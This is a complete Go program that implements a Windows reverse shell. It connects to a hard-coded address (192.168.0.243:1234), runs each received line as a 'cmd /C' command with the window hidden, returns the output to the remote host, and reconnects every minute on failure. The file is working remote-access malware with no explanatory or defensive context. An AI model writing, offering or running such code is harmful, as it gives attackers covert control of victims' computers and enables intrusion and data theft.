package main

import (
	"bufio"
	"net"
	"os/exec"
	"syscall"
	"time"
)

func reverse(host string) {
	c, err := net.Dial("tcp", host)
	if err != nil {
		if c != nil {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverse(host)
	}

	bufReader := bufio.NewReader(c)
	for {
		externCmd, err := bufReader.ReadString('\n')
		if err != nil {
			c.Close()
			reverse(host)
		}
		cmd := exec.Command("cmd", "/C", externCmd)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()

		c.Write(out)
	}
}

func main() {
	reverse("192.168.0.243:1234")
}
